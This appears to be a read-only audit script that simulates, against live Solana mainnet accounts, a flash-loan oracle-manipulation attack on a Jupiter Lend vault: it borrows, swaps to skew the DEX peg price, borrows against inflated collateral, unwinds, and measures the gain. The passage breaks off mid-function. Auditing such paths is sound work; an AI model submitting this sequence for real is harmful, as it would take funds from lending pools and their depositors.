#!/usr/bin/env node
// Current-mainnet, read-only v1 composition tests for the Jupiter DEX peg path.
// This script only calls get*/simulateTransaction. It never signs or submits.

const fs = require('fs');
const crypto = require('crypto');
const {
  Connection, PublicKey, TransactionInstruction,
} = require('/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/audit-tools/node_modules/@solana/web3.js');
const {BorshAccountsCoder} = require('/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/audit-tools/node_modules/@coral-xyz/anchor');
const bsModule = require('/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/audit-tools/node_modules/bs58');
const bs58 = bsModule.default || bsModule;
const {encodeV1} = require('./klend-v1-composition.js');

const root = '/Users/stacc/the-composer-rescue/composer-runs/2026-10-15';
const idlRoot = '/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/jupiter-lend-current/public/idl';
const env = Object.fromEntries(fs.readFileSync('/tmp/composer-helius-only.env', 'utf8')
  .split('\n').filter(Boolean).map(line => line.split(/=(.*)/s).slice(0, 2)));
const rpcUrl = env.HEAVY_RPC_URL || env.RPC_URL;
if (!rpcUrl) throw new Error('No read-only RPC configured');
const conn = new Connection(rpcUrl, 'confirmed');
const P = value => new PublicKey(value);

const PROGRAM = {
  vaults: P('jupr81YtYssSyPt8jbnGuiWon5f6x9TcDEFxYe3Bdzi'),
  oracle: P('jupnw4B6Eqs7ft6rxpzYLJZYSnrpRgPcr589n5Kv4oc'),
  dex: P('jupZ4m2GqUCJ5iueMfzQf8khFfH31d4XAQt3RzCT9Vd'),
  liquidity: P('jupeiUmn818Jg1ekPURTpr4mFo29p46vygyykFJ3wZC'),
  klend: P('KLend2g3cP87fffoy8q1mQqGKjrxjC8boSyAYavgmjD'),
  token: P('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
};
const ADDRESS = {
  owner: P('8v9jRkjCZBM37ZQwqE6wtPzUiCmp9UXHgFy4ZfdKA4Bc'),
  ownerToken0: P('A7ocpjA6BixfD1tdP8fR88WQtfaSTmqG2ANQ8sU7jGwg'),
  ownerUsdc: P('GmyD7LwCfLmLtb653YRSZ5WYZ1NxGpaBJ19VtjqDjkYz'),
  position: P('5zvef6wHFnL4sHc2TyRryYENqja5nFgfuPLkE7xBCZiK'),
  positionNft: P('EuaDXziFoqtfN8sXd7Drry6wcTuxYFVMGxiLBYqMT7aE'),
  vaultConfig: P('XHmMVu4A7Fo9kCGbzptcdo5QD85Bwd2ML9WKRWS8SYZ'),
  vaultState: P('3onFe68bGkejSA8Dwbun9vBgdYSCvPkt8nxvCYDryodY'),
  vaultOracle: P('oJFwnW7DbwyukCks2qv4LCd3749CrdBFqtJVfZZwKnN'),
  dexPegConfig: P('422W6hkXSnfGXSQMuRtC3sknFQRRbX5gnqoLnPcAPQnu'),
  dex: P('4XGHBkFVPwYacnVSGQHeTcf6jFgTH8twGPECRDxVcbtt'),
  token0Mint: P('6FrrzDk5mQARGc1TDYoyVnSyRdds1t4PbtohCD6p3tgG'),
  usdcMint: P('EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v'),
  dexSupply0: P('8kJRtak9axNoao5eMvnGj3B4yMTnDN1WVz8jsfgvkgos'),
  dexSupply1: P('7WH7ppy1Typz3nE1jFDXfefpSTbGZG8M9uC2D5qyieYM'),
  reserve0: P('8QaoQwwM6FGPB5zCTfxdwi18ASR17Qkz7zSECpVfJedM'),
  reserve1: P('94vK29npVbyRHXH63rRcTiSr26SFhrQTzbpNJuhQEDu'),
  vault0: P('ACezeW3xFEMBn2CCAXpP7ExNw8zPi1vgBZ9ah4Re3aL7'),
  vault1: P('BmkUoKMFYBxNSzWXyUjyMJjMAaVz4d8ZnxwwmhDCUXFB'),
  currentTick: P('B2pj6vYSi8Fdwd8tJj98k3T4nJAZY29DwAzyNAvyt58z'),
  currentTickId: P('83b3aQs1jfAB2SsRthohBi7kVKDfAB1CnZKTELdGF4Ei'),
};
const SOURCE = {
  operate: '7KffYwMq14RzJbaS5NEpPLfBqByX8QY7qWJsBWQGxWDecU3LVzbGA2XoJEUNsb2Hb7RCJ3gBNRjUbDQu3nVsxqx',
  swap: '4mEBhHnZgjPs4R94BsrJNDqgBZQAe9bwMUNZ8EkAaGzwNEVSggmeyg6ZbfgnJWDrkrNvFyX6cK9Tov7RhFLEJwxg',
};
const DISC = {
  operatePerfectDex: Buffer.from([88, 34, 180, 77, 152, 186, 166, 162]),
  swapIn: Buffer.from([141, 172, 10, 208, 69, 9, 56, 154]),
  swapOut: Buffer.from([206, 36, 149, 14, 163, 132, 148, 1]),
  getBothExchangeRate: Buffer.from([92, 88, 161, 46, 230, 193, 46, 237]),
};

const vaultIdl = JSON.parse(fs.readFileSync(`${idlRoot}/vaults.json`, 'utf8'));
const dexIdl = JSON.parse(fs.readFileSync(`${idlRoot}/dex.json`, 'utf8'));
const liquidityIdl = JSON.parse(fs.readFileSync(`${idlRoot}/liquidity.json`, 'utf8'));
const vaultCoder = new BorshAccountsCoder(vaultIdl);
const dexCoder = new BorshAccountsCoder(dexIdl);
const liquidityCoder = new BorshAccountsCoder(liquidityIdl);
const reserveCoder = new BorshAccountsCoder(JSON.parse(fs.readFileSync(
  `${root}/marginfi-source/idls-complete/kamino_lending.json`, 'utf8')));
const dexSpecs = Object.fromEntries(dexIdl.instructions.map(ix => [ix.name, ix]));

const u64 = value => {
  const out = Buffer.alloc(8);
  out.writeBigUInt64LE(value);
  return out;
};
const u16 = value => { const out = Buffer.alloc(2); out.writeUInt16LE(value); return out; };
const u32 = value => { const out = Buffer.alloc(4); out.writeUInt32LE(value); return out; };
const signedI32 = value => { const out = Buffer.alloc(4); out.writeInt32LE(value); return out; };
const i128 = value => {
  if (value < 0) value += 1n << 128n;
  const out = Buffer.alloc(16);
  for (let i = 0; i < 16; i++) {
    out[i] = Number(value & 255n);
    value >>= 8n;
  }
  return out;
};
const readU128 = (data, offset = 0) => {
  let out = 0n;
  for (let i = 15; i >= 0; i--) out = (out << 8n) + BigInt(data[offset + i]);
  return out;
};
const bn = value => BigInt(value.toString());
const tokenAmount = account => account && account.owner.equals(PROGRAM.token) && account.data.length === 165 ?
  account.data.readBigUInt64LE(64) : null;

async function jsonRpc(url, method, params) {
  const response = await fetch(url, {method: 'POST', headers: {'content-type': 'application/json'},
    body: JSON.stringify({jsonrpc: '2.0', id: `${method}-${Date.now()}`, method, params})});
  const json = await response.json();
  if (json.error) throw new Error(`${method}: ${JSON.stringify(json.error)}`);
  return json.result;
}

async function extractOperate() {
  const tx = await conn.getTransaction(SOURCE.operate,
    {commitment: 'confirmed', maxSupportedTransactionVersion: 1});
  if (!tx || tx.meta?.err) throw new Error('OperatePerfectDex source unavailable');
  const accountKeys = tx.transaction.message.getAccountKeys({accountKeysFromLookups: tx.meta.loadedAddresses});
  const compiled = tx.transaction.message.compiledInstructions.find(ix =>
    accountKeys.get(ix.programIdIndex).equals(PROGRAM.vaults) &&
    Buffer.from(ix.data).subarray(0, 8).equals(DISC.operatePerfectDex));
  if (!compiled) throw new Error('OperatePerfectDex source instruction unavailable');
  const keys = compiled.accountKeyIndexes.map(index => ({
    pubkey: accountKeys.get(index),
    isSigner: tx.transaction.message.isAccountSigner(index),
    isWritable: tx.transaction.message.isAccountWritable(index),
  }));
  // The historical instruction moved this position from -1492 to its live -1583 tick.
  // A small additional perfect-share deposit remains in the same tick, so both sides
  // of the update must point to the current Tick and TickIdLiquidation accounts.
  keys[13].pubkey = ADDRESS.currentTick;
  keys[14].pubkey = ADDRESS.currentTick;
  keys[15].pubkey = ADDRESS.currentTickId;
  keys[16].pubkey = ADDRESS.currentTickId;
  return {slot: tx.slot, keys};
}

async function extractSwapAccounts() {
  const tx = await conn.getParsedTransaction(SOURCE.swap,
    {commitment: 'confirmed', maxSupportedTransactionVersion: 1});
  if (!tx || tx.meta?.err) throw new Error('DEX swap source unavailable');
  const inner = (tx.meta.innerInstructions || []).flatMap(group => group.instructions || []);
  const source = inner.find(ix => ix.programId?.equals?.(PROGRAM.dex) && ix.data &&
    Buffer.from(bs58.decode(ix.data)).subarray(0, 8).equals(DISC.swapIn));
  if (!source || source.accounts.length !== 24) throw new Error('DEX SwapIn CPI source unavailable');
  const addresses = source.accounts.map(x => P(x));
  addresses[0] = ADDRESS.owner;
  addresses[2] = ADDRESS.ownerToken0;
  addresses[3] = ADDRESS.ownerUsdc;
  addresses[4] = ADDRESS.owner;
  addresses[5] = ADDRESS.ownerToken0;
  addresses[6] = ADDRESS.ownerUsdc;
  const spec = dexSpecs.swap_in;
  const keys = addresses.map((pubkey, i) => ({pubkey,
    isSigner: !!spec.accounts[i].signer, isWritable: !!spec.accounts[i].writable}));
  return {slot: tx.slot, keys};
}

function operateData(perfectShares = 1000000n, newDebtRaw = 0n) {
  // T2 smart-collateral vault: collateral leg must be present even for a
  // debt-idle operation. Deposit 0.001 perfect share, with generous token
  // bounds; leave the non-smart USDC debt unchanged.
  return Buffer.concat([
    DISC.operatePerfectDex,
    Buffer.from([1, 1]), // col Some, perfect amounts Some
    i128(perfectShares), i128(1000000000000n), i128(1000000000000n),
    Buffer.from([0]), // new_col None (smart side)
    Buffer.from([1, 0, 1]), i128(newDebtRaw), // debt Some, perfect None, normal USDC delta
    Buffer.from([1, 1]), // transfer_type Some(Direct)
    Buffer.from([4, 0, 0, 0, 6, 1, 10, 0]), // sources, branches, ticks, tick-debt arrays
  ]);
}

function dexSwap(keys, exactOut, maxInput, reverse = false) {
  const name = reverse ? 'swap_in' : 'swap_out';
  const data = reverse ? Buffer.concat([DISC.swapIn, Buffer.from([1]), u64(exactOut), u64(0n)]) :
    Buffer.concat([DISC.swapOut, Buffer.from([0]), u64(exactOut), u64(maxInput)]);
  return new TransactionInstruction({programId: PROGRAM.dex,
    keys: keys.map(x => ({...x})), data});
}

function oracleRead() {
  return new TransactionInstruction({programId: PROGRAM.oracle, keys: [
    {pubkey: ADDRESS.vaultOracle, isSigner: false, isWritable: false},
    {pubkey: ADDRESS.dexPegConfig, isSigner: false, isWritable: false},
    {pubkey: ADDRESS.dex, isSigner: false, isWritable: false},
    {pubkey: ADDRESS.dexSupply0, isSigner: false, isWritable: false},
    {pubkey: ADDRESS.dexSupply1, isSigner: false, isWritable: false},
    {pubkey: ADDRESS.reserve0, isSigner: false, isWritable: false},
    {pubkey: ADDRESS.reserve1, isSigner: false, isWritable: false},
  // The current Oracle account stores nonce 91; handlers reject stale nonces.
  ], data: Buffer.concat([DISC.getBothExchangeRate, Buffer.from([91, 0])])});
}

function getFlashTemplates() {
  const sample = JSON.parse(fs.readFileSync(`${root}/kamino-flash-history.json`, 'utf8')).hits[0];
  const tx = sample.transaction;
  const msg = tx.transaction.message;
  const staticKeys = msg.accountKeys;
  const allKeys = [...staticKeys, ...(tx.meta.loadedAddresses?.writable || []),
    ...(tx.meta.loadedAddresses?.readonly || [])];
  const header = msg.header;
  const writable = index => index < staticKeys.length ?
    (index < header.numRequiredSignatures ?
      index < header.numRequiredSignatures - header.numReadonlySignedAccounts :
      index < staticKeys.length - header.numReadonlyUnsignedAccounts) :
    index < staticKeys.length + (tx.meta.loadedAddresses?.writable?.length || 0);
  const instruction = index => {
    const ix = msg.instructions[index];
    return new TransactionInstruction({programId: P(allKeys[ix.programIdIndex]),
      keys: ix.accounts.map(i => ({pubkey: P(allKeys[i]),
        isSigner: i < header.numRequiredSignatures, isWritable: writable(i)})),
      data: Buffer.from(bs58.decode(ix.data))});
  };
  const borrow = instruction(3);
  const repay = instruction(13);
  if (!borrow.programId.equals(PROGRAM.klend) || !repay.programId.equals(PROGRAM.klend))
    throw new Error('KLend flash source indexes changed');
  return {sample, borrow, repay};
}

function flashIx(template, amount, repayIndex) {
  const keys = template.keys.map(x => ({...x}));
  keys[0].pubkey = ADDRESS.owner;
  keys[6].pubkey = ADDRESS.ownerUsdc;
  const data = Buffer.from(template.data);
  data.writeBigUInt64LE(amount, 8);
  if (repayIndex !== undefined) data[16] = repayIndex;
  return new TransactionInstruction({programId: PROGRAM.klend, keys, data});
}

const watch = [
  ['ownerNative', ADDRESS.owner], ['ownerToken0', ADDRESS.ownerToken0], ['ownerUsdc', ADDRESS.ownerUsdc],
  ['position', ADDRESS.position], ['dexSupply0', ADDRESS.dexSupply0],
  ['dexSupply1', ADDRESS.dexSupply1], ['reserve1', ADDRESS.reserve1],
];

function getRatioAtTick(tick) {
  const factors = [
    0x10000000000000000n, 0xff9dd7de423466c2n, 0xff3bd55f4488ad27n,
    0xfe78410fd6498b74n, 0xfcf2d9987c9be179n, 0xf9ef02c4529258b0n,
    0xf402d288133a85a1n, 0xe895615b5beb6386n, 0xd34f17a00ffa00a8n,
    0xae6b7961714e2055n, 0x76d6461f27082d75n, 0x372a3bfe0745d8b7n,
    0xbe32cbee4897976n, 0x8d4f70c9ff4925n, 0x4e009ae55194n,
  ];
  const absolute = Math.abs(tick);
  let factor = absolute & 1 ? factors[1] : factors[0];
  for (let bit = 2, i = 2; i < factors.length; i++, bit <<= 1)
    if (absolute & bit) factor = factor * factors[i] >> 64n;
  let precision = 0n;
  if (tick >= 0) {
    factor = ((1n << 128n) - 1n) / factor;
    if (factor % 0x10000n) precision = 1n;
  }
  return (factor >> 16n) + precision;
}

function getTickAtRatio(target) {
  let low = -16383;
  let high = 16383;
  while (low < high) {
    const middle = Math.ceil((low + high) / 2);
    if (getRatioAtTick(middle) <= target) low = middle;
    else high = middle - 1;
  }
  return low;
}

function deriveTickAccounts(tick, totalIds = 0) {
  const shifted = tick - (-16383);
  const tickData = PublicKey.findProgramAddressSync([
    Buffer.from('tick'), u16(98), signedI32(shifted),
  ], PROGRAM.vaults)[0];
  const tickMap = Math.floor((totalIds + 2) / 3);
  const tickId = PublicKey.findProgramAddressSync([
    Buffer.from('tick_id_liquidation'), u16(98), signedI32(shifted), u32(tickMap),
  ], PROGRAM.vaults)[0];
  return {tick, totalIds, tickMap, tickData, tickId};
}

function initTickInstructions(accounts) {
  const system = P('11111111111111111111111111111111');
  return [
    new TransactionInstruction({programId: PROGRAM.vaults, keys: [
      {pubkey: ADDRESS.owner, isSigner: true, isWritable: true},
      {pubkey: ADDRESS.vaultConfig, isSigner: false, isWritable: false},
      {pubkey: accounts.tickData, isSigner: false, isWritable: true},
      {pubkey: system, isSigner: false, isWritable: false},
    ], data: Buffer.concat([Buffer.from([22, 13, 62, 141, 73, 89, 178, 29]),
      u16(98), signedI32(accounts.tick)])}),
    new TransactionInstruction({programId: PROGRAM.vaults, keys: [
      {pubkey: ADDRESS.owner, isSigner: true, isWritable: true},
      {pubkey: accounts.tickData, isSigner: false, isWritable: false},
      {pubkey: accounts.tickId, isSigner: false, isWritable: true},
      {pubkey: system, isSigner: false, isWritable: false},
    ], data: Buffer.concat([Buffer.from([56, 110, 121, 169, 152, 241, 86, 183]),
      u16(98), signedI32(accounts.tick), u32(accounts.totalIds)])}),
  ];
}

function decodeOracleReturns(logs) {
  const prefix = `Program return: ${PROGRAM.oracle.toBase58()} `;
  return (logs || []).filter(line => line.startsWith(prefix)).map((line, index) => {
    const raw = Buffer.from(line.slice(prefix.length), 'base64');
    return {index, supplyRateX15: readU128(raw, 0).toString(),
      borrowRateX15: readU128(raw, 16).toString(), rawBase64: line.slice(prefix.length)};
  });
}

function decodeAccount(label, account) {
  if (!account) return null;
  const raw = Buffer.isBuffer(account.data) ? account.data : Buffer.from(account.data[0], 'base64');
  const owner = typeof account.owner === 'string' ? account.owner : account.owner.toBase58();
  if (label === 'ownerNative')
    return {kind: 'nativeAccount', lamports: String(account.lamports)};
  if (owner === PROGRAM.token.toBase58() && raw.length === 165)
    return {kind: 'splToken', amountRaw: raw.readBigUInt64LE(64).toString(),
      mint: new PublicKey(raw.subarray(0, 32)).toBase58(),
      authority: new PublicKey(raw.subarray(32, 64)).toBase58()};
  try {
    if (label === 'position') {
      const p = vaultCoder.decode('Position', raw);
      const supply = bn(p.supply_amount);
      const debt = (getRatioAtTick(p.tick) * (supply + 1n) >> 48n) + 1n;
      return {kind: 'vaultPosition', vaultId: p.vault_id, nftId: p.nft_id,
        tick: p.tick, tickId: p.tick_id, supplyRaw: supply.toString(),
        dustDebtRaw: bn(p.dust_debt_amount).toString(), debtInternalRaw: debt.toString()};
    }
    if (label === 'vaultState') {
      const s = vaultCoder.decode('VaultState', raw);
      return {kind: 'vaultState', totalSupplyRaw: bn(s.total_supply).toString(),
        totalBorrowRaw: bn(s.total_borrow).toString(), topmostTick: s.topmost_tick,
        supplyExchangePriceX12: bn(s.vault_supply_exchange_price).toString(),
        borrowExchangePriceX12: bn(s.vault_borrow_exchange_price).toString()};
    }
    if (label === 'dex') {
      const d = dexCoder.decode('Dex', raw);
      return {kind: 'dex', dexId: d.dex_id, feeBps4: d.fee,
        centerPriceX15: bn(d.center_price).toString(),
        totalSupplyShares: bn(d.total_supply_shares).toString()};
    }
    if (label === 'dexSupply0' || label === 'dexSupply1') {
      const p = liquidityCoder.decode('UserSupplyPosition', raw);
      return {kind: 'liquiditySupplyPosition', amountRaw: bn(p.amount).toString(),
        withdrawalLimitRaw: bn(p.withdrawal_limit).toString(),
        baseWithdrawalLimitRaw: bn(p.base_withdrawal_limit).toString()};
    }
    if (label === 'reserve0' || label === 'reserve1') {
      const r = liquidityCoder.decode('TokenReserve', raw);
      return {kind: 'liquidityReserve', supplyExchangePriceX12: bn(r.supply_exchange_price).toString(),
        borrowExchangePriceX12: bn(r.borrow_exchange_price).toString(),
        totalSupplyRaw: bn(r.total_supply_with_interest).toString(),
        totalBorrowRaw: bn(r.total_borrow_with_interest).toString()};
    }
  } catch (error) {
    return {kind: 'programState', decodeError: error.message,
      sha256: crypto.createHash('sha256').update(raw).digest('hex')};
  }
  return {kind: 'programState', sha256: crypto.createHash('sha256').update(raw).digest('hex')};
}

function decodeAccounts(accounts) {
  return Object.fromEntries(watch.map(([label], i) => [label, decodeAccount(label, accounts?.[i])]));
}

function scopedEquity(snapshot, oraclePrice) {
  const nativeLamports = BigInt(snapshot.ownerNative?.lamports || 0);
  const token0 = BigInt(snapshot.ownerToken0?.amountRaw || 0);
  const usdc = BigInt(snapshot.ownerUsdc?.amountRaw || 0);
  const supply = BigInt(snapshot.position?.supplyRaw || 0);
  const debtInternal = BigInt(snapshot.position?.debtInternalRaw || 0);
  const price = BigInt(oraclePrice || 0);
  // Smart-collateral shares use 9 decimals and both pool assets use 6;
  // Oracle prices use 1e15. Position debt is internally scaled to 9 decimals.
  const collateralUsdcRaw = supply * price / 1000000000000000000n;
  const debtUsdcRaw = debtInternal / 1000n;
  return {nativeLamports: nativeLamports.toString(), token0RawAtPeg: token0.toString(), usdcRaw: usdc.toString(),
    collateralUsdcRaw: collateralUsdcRaw.toString(), debtUsdcRaw: debtUsdcRaw.toString(),
    totalUsdcRawAtPeg: (token0 + usdc + collateralUsdcRaw - debtUsdcRaw).toString()};
}

function formatBps(delta, denominator) {
  const negative = delta < 0n;
  if (negative) delta = -delta;
  const scaled = delta * 1000000000000n / denominator; // bps with 8 decimals
  const integer = scaled / 100000000n;
  const fraction = (scaled % 100000000n).toString().padStart(8, '0');
  return `${negative ? '-' : ''}${integer}.${fraction}`;
}

async function main() {
  const operateSource = await extractOperate();
  const swapSource = await extractSwapAccounts();
  const flash = getFlashTemplates();
  const flashReserveInfo = await conn.getAccountInfoAndContext(flash.borrow.keys[3].pubkey, 'confirmed');
  const flashReserve = reserveCoder.decode('Reserve', flashReserveInfo.value.data);
  const flashAvailable = BigInt(flashReserve.liquidity.total_available_amount.toString());
  if (flashReserve.config.fees.flash_loan_fee_sf.toString() !== '0')
    throw new Error('Flash fee is no longer zero');
  watch.push(['flashSupply', flash.borrow.keys[5].pubkey],
    ['flashFeeVault', flash.borrow.keys[7].pubkey]);
  const preContext = await conn.getMultipleAccountsInfoAndContext(watch.map(x => x[1]), 'confirmed');
  const pre = decodeAccounts(preContext.value);
  const preOracleResult = await simulate('direct_oracle_control', [oracleRead()], false);
  const prePrice = preOracleResult.oracleReturns[0]?.supplyRateX15;
  const preEquity = scopedEquity(pre, prePrice);
  const operate = new TransactionInstruction({programId: PROGRAM.vaults,
    keys: operateSource.keys, data: operateData()});
  const operateBorrowOne = new TransactionInstruction({programId: PROGRAM.vaults,
    keys: operateSource.keys, data: operateData(1000000n, 1n)});
  const borrowRaw = 1000n;
  const finalCol = BigInt(pre.position.supplyRaw) + 1000000n;
  const finalNetDebt = BigInt(pre.position.debtInternalRaw) + borrowRaw * 1000n -
    BigInt(pre.position.dustDebtRaw);
  const borrowFinalTick = getTickAtRatio(finalNetDebt * (1n << 48n) / finalCol) + 1;
  const borrowTickAccounts = deriveTickAccounts(borrowFinalTick, 0);
  const existingBorrowTickAccounts = await conn.getMultipleAccountsInfo([
    borrowTickAccounts.tickData, borrowTickAccounts.tickId,
  ], 'confirmed');
  const borrowSetup = existingBorrowTickAccounts.every(Boolean) ? [] :
    initTickInstructions(borrowTickAccounts);
  const borrowKeys = operateSource.keys.map(x => ({...x}));
  borrowKeys[14].pubkey = borrowTickAccounts.tickData;
  borrowKeys[16].pubkey = borrowTickAccounts.tickId;
  const operateBorrowMinimum = new TransactionInstruction({programId: PROGRAM.vaults,
    keys: borrowKeys, data: operateData(1000000n, borrowRaw)});
  const cases = [
    {label: 'operate_control', instructions: [operate, oracleRead()]},
    {label: 'operate_borrow_minimum_control',
      instructions: [...borrowSetup, operateBorrowMinimum, oracleRead()]},
    {label: 'max_flash_same_four_billion_output', out: 4000000000n, flash: flashAvailable},
    {label: 'max_flash_minus_one_same_four_billion_output', out: 4000000000n,
      flash: flashAvailable - 1n},
    {label: 'max_flash_plus_one_same_four_billion_output', out: 4000000000n,
      flash: flashAvailable + 1n},
    {label: 'large_near_ninety_percent_token0_reserve', out: 4000000000n,
      flash: flashAvailable},
    {label: 'large_with_atomic_pre_read', out: 4000000000n,
      flash: flashAvailable, atomicPreRead: true},
    {label: 'large_with_minimum_borrow_consumer', out: 4000000000n,
      flash: flashAvailable, consumer: operateBorrowMinimum, setup: borrowSetup},
    {label: 'dex_reserve_minus_one', out: BigInt(pre.dexSupply0.amountRaw) - 1n,
      flash: flashAvailable},
    {label: 'dex_reserve_exact', out: BigInt(pre.dexSupply0.amountRaw),
      flash: flashAvailable},
    {label: 'dex_reserve_plus_one', out: BigInt(pre.dexSupply0.amountRaw) + 1n,
      flash: flashAvailable},
    ...[1n, 2n, 10n, 100n, 999n, 1000n, 1001n, 1024n, 2048n,
      4096n, 9999n, 10000n, 10001n, 100000n, 1000000n,
      10000000n, 100000000n, 1000000000n,
      2500000000n, 3500000000n, 4050000000n, 4060000000n,
      4070000000n, 4080000000n, 4090000000n,
      4100000000n, 4200000000n, 4300000000n, 4400000000n,
      4500000000n].map(out => ({label: `grid_${out}`, out, flash: flashAvailable})),
  ];
  const results = [preOracleResult];
  for (const item of cases) {
    let instructions = item.instructions;
    if (!instructions) {
      const consumer = item.consumer || operate;
      instructions = [
        flashIx(flash.borrow, item.flash), ...(item.setup || []),
        ...(item.atomicPreRead ? [oracleRead()] : []),
        dexSwap(swapSource.keys, item.out, item.flash, false), consumer,
        dexSwap(swapSource.keys, item.out, 0n, true),
        ...(item.atomicPreRead ? [] : [oracleRead()]),
        flashIx(flash.repay, item.flash, 0),
      ];
    }
    const result = await simulate(item.label, instructions);
    result.requestedToken0OutRaw = item.out?.toString();
    result.flashAmountRaw = item.flash?.toString();
    let finalPrice = result.oracleReturns.at(-1)?.supplyRateX15 || prePrice;
    if (item.atomicPreRead || item.consumer) {
      const unwindReference = results.find(x =>
        x.label === 'large_near_ninety_percent_token0_reserve');
      finalPrice = unwindReference?.oracleReturns.at(-1)?.supplyRateX15 || finalPrice;
      result.finalPriceReference = unwindReference ? unwindReference.label : null;
    }
    result.scopedPreEquity = preEquity;
    result.scopedPostEquity = !result.err && !result.rpcError && result.post ?
      scopedEquity(result.post, finalPrice) : null;
    if (!result.err && !result.rpcError && result.scopedPostEquity)
      result.scopedEquityDeltaUsdcRaw = (BigInt(result.scopedPostEquity.totalUsdcRawAtPeg) -
        BigInt(preEquity.totalUsdcRawAtPeg)).toString();
    if (!result.err && !result.rpcError && result.scopedPostEquity)
      result.scopedNativeLamportsDelta = (BigInt(result.scopedPostEquity.nativeLamports) -
        BigInt(preEquity.nativeLamports)).toString();
    results.push(result);
    console.log(JSON.stringify({label: result.label, err: result.err,
      rpcError: result.rpcError, bytes: result.v1Bytes, accounts: result.accountCount,
      instructions: result.instructionCount, units: result.unitsConsumed,
      oracleReturns: result.oracleReturns, equityDelta: result.scopedEquityDeltaUsdcRaw,
      lastLogs: result.logs?.slice(-7)}));
  }

  const large = results.find(x => x.label === 'large_near_ninety_percent_token0_reserve');
  const largePre = results.find(x => x.label === 'large_with_atomic_pre_read');
  const largeBorrow = results.find(x => x.label === 'large_with_minimum_borrow_consumer');
  const atomicPrePrice = BigInt(largePre.oracleReturns[0].supplyRateX15);
  const manipulatedPrice = BigInt(largePre.oracleReturns[1].supplyRateX15);
  const postUnwindPrice = BigInt(large.oracleReturns.at(-1).supplyRateX15);
  const reserve0Start = BigInt(pre.dexSupply0.amountRaw);
  const largeSummary = {
    requestedToken0OutRaw: large.requestedToken0OutRaw,
    token0ReservePositionStartRaw: reserve0Start.toString(),
    requestedFractionOfToken0ReserveBps: formatBps(BigInt(large.requestedToken0OutRaw), reserve0Start),
    atomicPrePriceX15: atomicPrePrice.toString(), manipulatedConsumerPriceX15: manipulatedPrice.toString(),
    postUnwindPriceX15: postUnwindPrice.toString(),
    manipulatedVsAtomicPreBps: formatBps(manipulatedPrice - atomicPrePrice, atomicPrePrice),
    postUnwindVsAtomicPreBps: formatBps(postUnwindPrice - atomicPrePrice, atomicPrePrice),
    positionCollateralStartUsdcRaw: (BigInt(pre.position.supplyRaw) * atomicPrePrice /
      1000000000000000000n).toString(),
    manipulatedPositionValueUpliftUsdcRaw: (BigInt(pre.position.supplyRaw) *
      (manipulatedPrice - atomicPrePrice) / 1000000000000000000n).toString(),
    maximumAdditionalCreditAtTenPercentLtvUsdcRaw: (BigInt(pre.position.supplyRaw) *
      (manipulatedPrice - atomicPrePrice) / 1000000000000000000n * 100n / 1000n).toString(),
    minimumBorrowDeltaUsdcRaw: borrowRaw.toString(),
    noBorrowConsumerEquityDeltaUsdcRaw: large.scopedEquityDeltaUsdcRaw,
    minimumBorrowConsumerEquityDeltaUsdcRaw: largeBorrow.scopedEquityDeltaUsdcRaw,
    minimumBorrowConsumerNativeLamportsDelta: largeBorrow.scopedNativeLamportsDelta,
    flashSupplyRestored: largeBorrow.post.flashSupply.amountRaw === pre.flashSupply.amountRaw,
    flashFeeVaultRestored: largeBorrow.post.flashFeeVault.amountRaw === pre.flashFeeVault.amountRaw,
    v1Bytes: largeBorrow.v1Bytes, accountCount: largeBorrow.accountCount,
    instructionCount: largeBorrow.instructionCount, requiredSignatures: largeBorrow.requiredSignatures,
    unitsConsumed: largeBorrow.unitsConsumed,
  };
  const output = {
    timestamp: new Date().toISOString(), liveSubmission: false, signatureVerification: false,
    transport: 'current-mainnet get*/simulateTransaction only; no sendTransaction',
    currentSlot: preContext.context.slot,
    sources: {operateSignature: SOURCE.operate, operateSlot: operateSource.slot,
      swapSignature: SOURCE.swap, swapSlot: swapSource.slot,
      klendFlashSignature: flash.sample.signature, klendFlashSlot: flash.sample.slot},
    programs: Object.fromEntries(Object.entries(PROGRAM).map(([k, v]) => [k, v.toBase58()])),
    market: {vaultId: 98, vaultType: 'T2 smart collateral',
      oracleSourceType: 'DexSmartColPegOracle', addresses: Object.fromEntries(
        Object.entries(ADDRESS).map(([k, v]) => [k, v.toBase58()])),
      pricePath: ['Vaults OperatePerfectDex', 'Oracle GetBothExchangeRate',
        'DexSmartColPegOracle config', 'Jupiter DEX pool + its two Liquidity supply positions/reserves']},
    watch: watch.map(([label, address]) => ({label, address: address.toBase58()})),
    pre, preOraclePriceX15: prePrice, scopedPreEquity: preEquity, results,
    minimumBorrowConsumer: {borrowRaw: borrowRaw.toString(), finalTick: borrowFinalTick,
      finalTickAccount: borrowTickAccounts.tickData.toBase58(),
      finalTickIdAccount: borrowTickAccounts.tickId.toBase58(),
      setupInstructionsNeeded: borrowSetup.length},
    largeSummary,
    equityScope: 'Exact owner native lamports are reported separately. Token equity is owner token0 + owner USDC + v98 position collateral at the final observed oracle price - position debt; token0 is valued at its configured 1:1 peg. KLend supply/fee accounts and both DEX Liquidity supply positions are watched for restoration/value retention. Simulation does not charge a signed-transaction network fee.',
  };
  output.flashReserve = {address: flash.borrow.keys[3].pubkey.toBase58(),
    decodedAvailableRaw: flashAvailable.toString(), flashLoanFeeSf: '0',
    observedAtSlot: flashReserveInfo.context.slot};
  output.grid = {swapOutputValuesRaw: cases.filter(x => x.label.startsWith('grid_'))
    .map(x => x.out.toString()),
    largestSuccessfulOutputRaw: results.filter(x => x.label.startsWith('grid_') &&
      !x.err && !x.rpcError && x.scopedEquityDeltaUsdcRaw !== undefined)
      .reduce((v, x) => BigInt(x.requestedToken0OutRaw) > v ?
        BigInt(x.requestedToken0OutRaw) : v, 0n).toString()};
  fs.writeFileSync(`${root}/jupiter-dex-peg-input-grid.json`, JSON.stringify(output, null, 2));

  async function simulate(label, instructions, includeWatchedAccounts = true) {
    try {
      const blockhash = (await conn.getLatestBlockhash('confirmed')).blockhash;
      const encoded = encodeV1(instructions, ADDRESS.owner, blockhash);
      const response = await fetch(rpcUrl, {method: 'POST', headers: {'content-type': 'application/json'},
        body: JSON.stringify({jsonrpc: '2.0', id: label, method: 'simulateTransaction', params: [
          encoded.wire.toString('base64'), {encoding: 'base64', sigVerify: false,
